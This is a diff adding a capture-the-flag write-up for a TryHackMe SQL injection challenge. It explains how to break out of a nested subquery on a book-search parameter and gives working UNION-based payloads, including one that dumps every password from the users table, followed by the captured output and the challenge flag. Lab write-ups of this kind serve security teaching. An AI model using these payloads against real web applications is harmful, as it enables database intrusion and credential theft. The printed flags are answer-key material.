@@ -482,3 +482,74 @@ Summary Table: Module 7 Details
 | Target Password Reset      | Overwrote admin password to 123                                               | 
 | Captured Flag              | THM{cd5c4f197d708fda06979f13d8081013}                                         |
 
+## SQL Injection Lab (Module 8)
+Executive Summary
+This document outlines the vulnerability analysis, payload development, and full exploitation methodology for Task 9: Vulnerable Startup: Book Title (Challenge 6) on TryHackMe. The target application features a book search function vulnerable to UNION-Based SQL Injection nested inside a subquery. By breaking out of the subquery context using '), an attacker can concatenate arbitrary database queries to exfiltrate table records—including user password fields—to recover the challenge flag.
+
+Target & Vulnerability Overview
+- Target Application: Book Title Search ```([http://10.48.174.24:5000/challenge6/](http://10.48.174.24:5000/challenge6/))```
+- Target Endpoint: ```/challenge6/book```
+- Vulnerable Parameter: ```title``` (GET request)
+- Vulnerability Class: UNION-Based SQL Injection (Nested Subquery Breakout)
+- Objective: Break out of the subquery structure, enumerate column counts, and retrieve the database records stored in the ```users``` table to obtain the flag.
+
+Vulnerability Mechanism Analysis
+1. Subquery Concatenation Vulnerability
+When searching for a book via the ```title``` parameter, the application executes a subquery containing an unsafe string concatenation wrapped in a SQL ```LIKE``` operator:
+```sql
+SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '' + title + '%')
+```
+2. Subquery Breakout Logic
+Because input is concatenated directly without sanitization:
+    1. Input starts inside the string literal ```'%``` after ```title LIKE '```.
+    2. Appending ```')``` terminates both the single-quoted string and the enclosing subquery parenthesis ```(SELECT id FROM books WHERE title LIKE '...')```.
+    3. Injecting a ```UNION SELECT``` statement allows full control over the structural results rendered on the page.
+
+Step-by-Step Exploitation Walkthrough
+Step 1: Application Setup & Authentication
+1. Navigate to ```[http://10.48.174.24:5000/challenge6/signup](http://10.48.174.24:5000/challenge6/signup)``` and register a standard user (e.g., ```test / 123```).
+2. Authenticate at ```/login``` and access the user dashboard (```/home```), which displays the message: "Testing a new function to search for books, check it out here".
+
+Step 2: Subquery Breakout & Boolean Verification
+Navigate to the vulnerable search function at ```[http://10.48.174.24:5000/challenge6/book?title=test](http://10.48.174.24:5000/challenge6/book?title=test)```.
+Test the subquery breakout with a boolean payload:
+- Payload: ```') or 1=1 -- -```
+- Executed Server-Side Query:
+```sql
+SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '') OR 1=1 -- -%')
+```
+- Result: The application returns all book records in the database, confirming full query manipulation.
+
+Step 3: Column Enumeration
+Inject a ```UNION SELECT``` payload to identify the required number of columns and reflection positions:
+- Payload: ```') Union select 1,2,3,4-- -```
+- Executed Query:
+```sql
+SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '') UNION SELECT 1,2,3,4-- -%')
+```
+- Rendered Reflection Positions:
+    - Title: 2
+    - Description: 3
+    - Author: 4
+
+Step 4: Database Exfiltration & Flag Capture
+Map the 4th output column (```Author```) to aggregate all password entries from the ```users``` table via ```group_concat()```:
+- Payload: ```') Union select 1,2,3,group_concat(password) from users-- -```
+- Full Request URL:
+```plaintext
+http://10.48.174.24:5000/challenge6/book?title=')+Union+select+1,2,3,group_concat(password)+from+users--+-
+```
+- Exfiltrated Output (Author position):
+```plaintext
+Author: THM{27f8f7ce3c05ca8d6553bc5948a89210},asd,Summer2019!,345m3io4hj3,viking123,123
+```
+Summary Table: Module 8 Details
+| Parameter / Metric       | Target Value / Result                                                                 |
+|:--                       |:--                                                                                    |
+| challenge Module         | Task 9 / Challenge 6 (Book Title)                                                     | 
+| Vulnerable URL           | [http://10.48.174.24:5000/challenge6/book](http://10.48.174.24:5000/challenge6/book)  | 
+| Vulnerability Class      | UNION-Based SQL Injection inside Subquery                                             | 
+| Vulnerable Parameter     | title (GET)                                                                           |
+| Breakout Sequence        | ')                                                                                    | 
+| Exfiltration Payload     | "') Union select 1,2,3,group_concat(password) from users-- -"                         |
+| Captured Flag            | THM{27f8f7ce3c05ca8d6553bc5948a89210}                                                 |
